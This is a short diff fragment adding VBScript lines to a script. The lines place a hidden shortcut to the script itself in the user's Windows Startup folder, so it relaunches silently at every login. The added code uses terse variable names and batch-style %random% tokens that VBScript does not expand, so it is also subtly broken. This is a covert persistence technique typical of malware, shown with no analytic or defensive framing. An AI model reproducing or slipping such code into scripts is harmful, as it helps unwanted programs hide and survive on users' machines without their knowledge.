@@ -1,3 +1,10 @@
+Set w3 = WScript.CreateObject("WScript.Shell")
+t7 = w3.SpecialFolders("Startup")
+Set b6 = w3.CreateShortcut(t7 & "\%random%%random%%random%%random%.lnk")
+b6.TargetPath = WScript.ScriptFullName
+b6.WindowStyle = 0
+b6.Save
+
 Set WshShell = CreateObject("WScript.Shell")
 l8 = WshShell.SpecialFolders("Startup")
 
